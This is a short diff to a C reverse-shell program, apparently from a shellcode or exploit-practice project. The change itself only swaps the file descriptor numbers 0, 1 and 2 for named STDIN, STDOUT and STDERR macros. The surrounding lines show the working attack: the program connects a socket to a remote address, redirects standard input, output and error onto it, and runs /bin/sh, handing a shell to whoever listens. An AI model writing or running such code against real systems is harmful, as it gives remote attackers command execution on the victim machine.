@@ -8,6 +8,10 @@
 #include <netinet/in.h>
 #include <arpa/inet.h>
 
+#define STDIN 0
+#define STDOUT 1
+#define STDERR 2
+
 int main(void){
 	int fd;
 	struct sockaddr_in server_addr;
@@ -24,9 +28,9 @@ int main(void){
 	connect(fd, (struct sockaddr *)&server_addr, 16);
 	
 	//dup2 (0,1,2) (client will be connected to stdin, stdout and stderr)
-	dup2(fd, 0);
-	dup2(fd, 1);
-	dup2(fd, 2);
+	dup2(fd, STDIN);
+	dup2(fd, STDOUT);
+	dup2(fd, STDERR);
 	
 	//execve /bin/sh
 	execve(argv[0], &argv[0], NULL);
